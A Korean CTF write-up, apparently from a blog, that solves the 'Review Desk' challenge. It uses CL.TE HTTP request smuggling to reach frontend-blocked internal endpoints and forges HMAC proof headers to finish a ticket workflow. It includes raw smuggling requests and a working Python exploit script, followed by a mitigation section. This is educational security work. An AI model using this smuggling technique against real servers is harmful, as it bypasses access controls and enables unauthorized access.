---
layout: post
title: Review Desk 문제 풀이
page_description: 2026 Incognito Finals애 출제된 Review Desk 문제의 취약점과 Write up
category_key: ctf-wargame
summary: 2026 Incognito Finals애 출제된 Review Desk 문제의 취약점과 Write up
lead: 2026 Incognito Finals애 출제된 Review Desk 문제의 취약점과 Write up
featured: false
feature_order: 0
---

# Incognito Review Desk Writeup

## 개요

이 문제는 공개 API 뒤에 숨겨진 내부 리뷰 시스템이 존재하고, 프론트엔드와 백엔드의 HTTP 요청 경계 해석 차이를 이용해 내부 요청을 끼워 넣는 `HTTP Request Smuggling` 문제다.

공격 흐름은 다음과 같다.

1. 공개 자료를 통해 서비스 구조와 워크플로 힌트를 수집한다.
2. `/api/report`에서 `CL.TE` desync가 가능하다는 가설을 세우고 검증한다.
3. smuggled request로 내부 단계 `/internal/s1`, `/internal/s3`를 호출한다.
4. 각 단계에서 발급된 ticket과 `X-Proof` 검증 규칙을 만족시켜 최종 `flag`를 획득한다.

최종 플래그:

```text
INCOGNITO{clte_d35ync_4step_ch41n_2026}
```

## 1. 공개 자료 분석

제공된 공개 자료는 다음 두 파일이다.

- `openapi.yaml`
- `internal_words.txt`

### 1.1 공개 엔드포인트

`openapi.yaml` 기준으로 외부에 드러난 엔드포인트는 다음 세 개다.

- `POST /api/report`
  - 익명 신고 등록
  - 입력: `title`, `body`
  - 출력: `reportId`
- `POST /api/chain`
  - 워크플로 진행
  - 입력: `event`, `ticket`
  - 출력: 다음 단계 `next`, 다음 ticket 또는 최종 `flag`
- `GET /api/status`
  - 공개 통계 조회

문서 설명에서 바로 중요한 힌트가 나온다.

- 내부 review endpoint는 문서화되지 않음
- workflow는 time-limited ticket을 사용함
- 이후 단계는 ticket과 요청 자체로부터 파생된 짧은 proof를 요구할 수 있음

즉, 공개 API만으로는 완결되지 않는 숨은 내부 단계가 있고, 중간 단계에서 proof 검증이 추가된다는 뜻이다.

### 1.2 공개 단어 목록

`internal_words.txt`에는 `handoff`, `finalize`, `s1`, `s3`, `review`, `internal-review` 등 내부 단계명으로 보이는 단어들이 포함되어 있다.

이 파일은 두 용도로 쓸 수 있다.

- `/api/chain`의 유효한 `event` 후보 탐색
- 숨은 내부 경로명 브루트포스 후보 생성

실제 probing 결과 `handoff`와 `finalize`는 `/api/chain`에서 유효 event였고, 내부 경로 쪽에서는 `/internal/s1`, `/internal/s3`가 핵심 단계로 드러났다.

## 2. Request Smuggling 가설과 검증

### 2.1 가설

문제 설명과 공개 API 구조상 가장 자연스러운 가설은 다음이다.

- 프론트엔드는 `Content-Length`를 기준으로 요청 바디 길이를 자른다.
- 백엔드는 `Transfer-Encoding: chunked`를 우선해 해석한다.
- 따라서 `CL.TE` 불일치가 있으면, 프론트엔드는 하나의 요청으로 본 바이트열을 백엔드는 두 개의 요청으로 분리할 수 있다.

이 경우 `/api/report`를 외형상 정상 요청처럼 보내면서, 그 뒤에 내부용 `GET /internal/...` 요청을 덧붙일 수 있다.

### 2.2 검증 방식

외부 요청은 다음 개념으로 구성했다.

```http
POST /api/report HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: <전체 길이>
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /internal/s1 HTTP/1.1
Host: target
Content-Length: 0

```

의도는 이렇다.

- 프론트엔드: `Content-Length`만 믿고 전체 바이트를 `/api/report`의 body로 전달
- 백엔드: `Transfer-Encoding: chunked`를 보고 body를 `0\r\n\r\n`에서 종료
- 남은 `GET /internal/s1 ...`은 다음 요청으로 처리

실제 관찰 결과는 다음 패턴이었다.

- 첫 번째 응답: `/api/report`가 빈 body로 처리되어 `title/body required`
- 두 번째 응답: smuggled 내부 요청의 실제 결과

이로써 `CL.TE` request smuggling이 성립함을 확인했다.

## 3. 내부 엔드포인트 탐색

직접 `/internal/*`에 접근하면 프론트엔드에서 일괄 `403 forbidden`이 반환됐다. 즉, 내부 경로는 프론트엔드 레벨에서 차단되고 있었다.

하지만 smuggled request는 백엔드로 직접 전달되므로, 같은 경로에 대해 실제 백엔드 라우팅 결과를 볼 수 있었다.

`internal_words.txt`의 후보를 바탕으로 smuggled `GET /internal/<word>`를 반복한 결과:

- `/internal/s1` -> `200 OK`
- `/internal/s3` -> `403 chain proof required`

응답 의미는 다음과 같았다.

- `/internal/s1`: 첫 ticket 발급 단계
- `/internal/s3`: 두 번째 내부 단계이며, ticket 외에 추가 proof가 필요

## 4. 워크플로와 proof 규칙 분석

### 4.1 단계별 흐름

실제 단계는 다음과 같이 이어진다.

1. `GET /internal/s1` smuggle
   - 응답: `next = handoff`, `ticket = t1`
2. `POST /api/chain` with `{"event":"handoff","ticket":t1}`
   - 응답: `next = internal-review`, `ticket = t2`
3. `GET /internal/s3` smuggle
   - 조건: `X-Chain`과 `X-Proof` 필요
   - 응답: `next = finalize`, `ticket = t3`
4. `POST /api/chain` with `{"event":"finalize","ticket":t3}`
   - 조건: `X-Chain`과 `X-Proof` 필요
   - 응답: `flag`

### 4.2 proof 규칙

문제 설명에서 `X-Proof`는 HMAC 계열이고, 메시지는 `METHOD:PATH` 형태라고 주어졌다.

실제 정답 규칙은 다음과 같다.

- 알고리즘: `HMAC-SHA256`
- key: 해당 단계의 ticket 문자열
- message:
  - 내부 단계 `/internal/s3`: `GET:/internal/s3`
  - 최종 단계 `/api/chain`: `POST:/api/chain`
- 관련 ticket 전달 헤더: `X-Chain`

즉:

```text
X-Proof = HMAC_SHA256(ticket, "METHOD:PATH").hexdigest()
```

### 4.3 주의점

`/internal/s3` 단계에서 ticket 전달 헤더는 `X-Ticket`이 아니라 `X-Chain`이어야 한다.

이 부분이 핵심 함정이다. `X-Proof` 규칙을 맞춰도 ticket를 다른 이름으로 넘기면 계속 `chain proof required`만 반환된다.

## 5. 익스플로잇 체인

### 5.1 1단계: `/internal/s1` smuggle

smuggled request:

```http
GET /internal/s1 HTTP/1.1
Host: host3.dreamhack.games:22679
Content-Length: 0

```

응답:

```json
{"ok":true,"next":"handoff","ticket":"t1"}
```

### 5.2 2단계: `handoff`

공개 API 호출:

```http
POST /api/chain
Content-Type: application/json

{"event":"handoff","ticket":"t1"}
```

응답:

```json
{"ok":true,"next":"internal-review","ticket":"t2"}
```

### 5.3 3단계: `/internal/s3` smuggle

헤더:

```text
X-Chain: t2
X-Proof: HMAC_SHA256(t2, "GET:/internal/s3").hexdigest()
```

smuggled request:

```http
GET /internal/s3 HTTP/1.1
Host: host3.dreamhack.games:22679
X-Chain: t2
X-Proof: <proof>
Content-Length: 0

```

응답:

```json
{"ok":true,"next":"finalize","ticket":"t3"}
```

### 5.4 4단계: `finalize`

헤더:

```text
X-Chain: t3
X-Proof: HMAC_SHA256(t3, "POST:/api/chain").hexdigest()
```

요청:

```http
POST /api/chain
Content-Type: application/json
X-Chain: t3
X-Proof: <proof>

{"event":"finalize","ticket":"t3"}
```

응답:

```json
{"ok":true,"flag":"INCOGNITO{clte_d35ync_4step_ch41n_2026}"}
```

## 6. 재현 방법

Exploit Code for PoC 

```python
import argparse
import hashlib
import hmac
import json
import socket
import time
from urllib import error, request
from urllib.parse import urlparse


def build_base_host(base_url: str) -> tuple[str, int, str]:
    # raw socket 요청을 만들 때는 host, port, Host 헤더 문자열이 각각 필요하다.
    parsed = urlparse(base_url)
    if parsed.scheme != "http":
        raise ValueError("Only http:// URLs are supported")
    if not parsed.hostname or not parsed.port:
        raise ValueError("Base URL must include host and port")
    return parsed.hostname, parsed.port, f"{parsed.hostname}:{parsed.port}"


def recv_all(sock: socket.socket, timeout: float = 1.2) -> str:
    # 백엔드는 짧은 keep-alive를 유지하므로, 즉시 연결 종료를 기다리지 않고
    # timeout이 날 때까지 응답을 읽는다.
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            chunks.append(chunk)
        except socket.timeout:
            break
    return b"".join(chunks).decode("latin1", "replace")


def extract_second_response(raw: str) -> str:
    # CL.TE desync가 성공하면:
    # 1) 바깥 /api/report 요청이 먼저 처리되고
    # 2) 뒤에 숨겨 넣은 내부 요청이 같은 연결의 다음 요청으로 처리된다.
    #
    # 우리가 필요한 것은 smuggled 내부 요청의 결과이므로 두 번째 응답을 꺼낸다.
    parts = [part for part in raw.split("HTTP/1.1 ") if part]
    if len(parts) < 2:
        raise RuntimeError(f"expected smuggled response, got:\n{raw}")
    return "HTTP/1.1 " + parts[1]


def response_body(raw_response: str) -> str:
    # raw HTTP 응답에서 JSON 본문 부분만 분리한다.
    try:
        return raw_response.split("\r\n\r\n", 1)[1]
    except IndexError as exc:
        raise RuntimeError(f"malformed HTTP response:\n{raw_response}") from exc


def smuggle_get(base_url: str, path: str, headers: dict[str, str] | None = None) -> str:
    # 전형적인 CL.TE request smuggling payload를 만든다.
    #
    # 프론트엔드:
    # - Content-Length를 믿고
    # - 전체 바이트를 하나의 /api/report body로 전달한다.
    #
    # 백엔드:
    # - Transfer-Encoding: chunked를 우선 해석하고
    # - "0\\r\\n\\r\\n"에서 바깥 body가 끝났다고 판단한 뒤
    # - 남은 바이트를 같은 연결의 다음 요청으로 다시 파싱한다.
    #
    # 그 남은 요청이 우리가 숨겨 넣는 내부 GET 요청이다.
    host, port, host_header = build_base_host(base_url)
    headers = headers or {}
    inner_headers = "".join(f"{name}: {value}\r\n" for name, value in headers.items())
    inner_request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"{inner_headers}"
        "Content-Length: 0\r\n"
        "\r\n"
    )
    outer_body = "0\r\n\r\n" + inner_request
    outer_request = (
        f"POST /api/report HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(outer_body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{outer_body}"
    )
    # smuggled 요청을 심은 뒤, 무해한 동기화 요청을 하나 더 보내서
    # 백엔드가 큐에 남아 있던 내부 요청까지 처리하고
    # 두 응답을 같은 TCP 연결로 돌려주게 만든다.
    sync_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(outer_request.encode("latin1"))
        time.sleep(0.02)
        sock.sendall(sync_request.encode("latin1"))
        raw = recv_all(sock)

    return extract_second_response(raw)


def post_json(base_url: str, path: str, payload: dict[str, str], headers: dict[str, str] | None = None) -> dict:
    # smuggling이 필요 없는 공개 API 단계용 일반 JSON 요청 헬퍼다.
    url = base_url.rstrip("/") + path
    body = json.dumps(payload).encode()
    req_headers = {"Content-Type": "application/json"}
    if headers:
        req_headers.update(headers)
    req = request.Request(url, data=body, headers=req_headers, method="POST")
    try:
        with request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except error.HTTPError as exc:
        raise RuntimeError(f"{path} failed: {exc.code} {exc.read().decode()}") from exc


def proof(ticket: str, method: str, path: str) -> str:
    # 문제의 proof 규칙:
    # X-Proof = HMAC-SHA256(ticket, "METHOD:PATH").hexdigest()
    message = f"{method}:{path}".encode()
    return hmac.new(ticket.encode(), message, hashlib.sha256).hexdigest()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "base_url",
        nargs="?",
        default="http://host3.dreamhack.games:22679",
        help="Target base URL, including port",
    )
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    # 1단계:
    # 공개 /api/report 요청 뒤에 GET /internal/s1 을 숨겨 넣어
    # 첫 번째 내부 워크플로 엔드포인트에 도달한다.
    s1_resp = smuggle_get(base_url, "/internal/s1")
    t1 = json.loads(response_body(s1_resp))["ticket"]
    print(f"[1] /internal/s1 -> {t1}")

    # 2단계:
    # 첫 내부 단계가 돌려준 handoff event로 공개 워크플로를 한 단계 진행한다.
    handoff = post_json(base_url, "/api/chain", {"event": "handoff", "ticket": t1})
    t2 = handoff["ticket"]
    print(f"[2] handoff -> {t2}")

    # 3단계:
    # 다음 숨은 단계는 /internal/s3 이다. 여기서는 둘 다 필요하다.
    # - X-Chain: 현재 워크플로 ticket
    # - X-Proof: HMAC-SHA256(ticket, "GET:/internal/s3")
    #
    # /internal/* 경로는 프론트엔드에서 막히므로 이 요청도 계속 smuggling으로 보낸다.
    s3_headers = {
        "X-Chain": t2,
        "X-Proof": proof(t2, "GET", "/internal/s3"),
    }
    s3_resp = smuggle_get(base_url, "/internal/s3", s3_headers)
    t3 = json.loads(response_body(s3_resp))["ticket"]
    print(f"[3] /internal/s3 -> {t3}")

    # 4단계:
    # 공개 /api/chain 엔드포인트에서 finalize를 호출한다.
    # proof 규칙은 같고, 이번에는 서명 메시지가 "POST:/api/chain" 이다.
    finalize_headers = {
        "X-Chain": t3,
        "X-Proof": proof(t3, "POST", "/api/chain"),
    }
    final = post_json(
        base_url,
        "/api/chain",
        {"event": "finalize", "ticket": t3},
        finalize_headers,
    )
    print(f"[4] flag = {final['flag']}")


if __name__ == "__main__":
    main()
```

실행 결과 예시:

```text
[1] /internal/s1 -> d7b5c0fd867561b64562cdb6b308993b3fd4
[2] handoff -> c8ba9d1aec0eaeafd4090b90b9ca1576e882
[3] /internal/s3 -> 5f15af1ba20d45bc9676df7a20307064a7bb
[4] flag = INCOGNITO{clte_d35ync_4step_ch41n_2026}
```

## 7. 취약점 원리 정리

이 문제의 핵심은 두 가지다.

- HTTP 요청 경계 해석 불일치
- 내부 워크플로 보호 로직의 잘못된 신뢰 경계

프론트엔드는 `/internal/*` 경로를 막고 있었지만, 백엔드가 이미 같은 연결에서 다음 요청을 읽도록 만들 수 있으면 그 차단은 무력화된다. 즉, 내부 보호 로직이 "프론트엔드가 막아 줄 것"이라는 가정에 기대고 있었던 셈이다.

이후 단계의 `X-Proof` 검증은 단독으로는 의미가 있다. 하지만 request smuggling으로 내부 라우트에 직접 도달할 수 있으면, 공격자는 각 단계에서 ticket를 발급받고 합법적인 proof도 직접 계산할 수 있다.

## 8. 대응 관점

실서비스에서의 대응 포인트는 다음과 같다.

- 프론트엔드와 백엔드가 동일한 HTTP 파서 정책을 사용하도록 강제한다. 되도록이면 HTTP/2 로 통일하는것이 좋다.
- `Content-Length`와 `Transfer-Encoding`이 동시에 존재하는 요청을 차단한다.
- 내부 엔드포인트 보호를 프론트엔드 경로 필터에만 의존하지 않는다.
- 백엔드 자체에서 인증, 권한, origin 검증을 수행한다.
- internal workflow ticket와 proof는 더 강한 바인딩이 필요하다.
  - 예: 사용자 세션, source identity, expiration, nonce, 단계별 context를 함께 검증
- 비정상 요청 처리 후 keep-alive 연결을 재사용하지 않도록 한다.

## 9. 결론

공개 자료만으로도 이 서비스가 공개 API와 내부 workflow로 분리되어 있고, 중간에 ticket/proof 단계가 존재한다는 점을 유추할 수 있었다.

이후 `CL.TE` request smuggling을 검증해 내부 경로 `/internal/s1`, `/internal/s3`에 직접 도달했고, `X-Chain`과 `HMAC-SHA256(ticket, "METHOD:PATH")` 규칙을 이용해 워크플로를 끝까지 진행하여 플래그를 획득할 수 있었다.
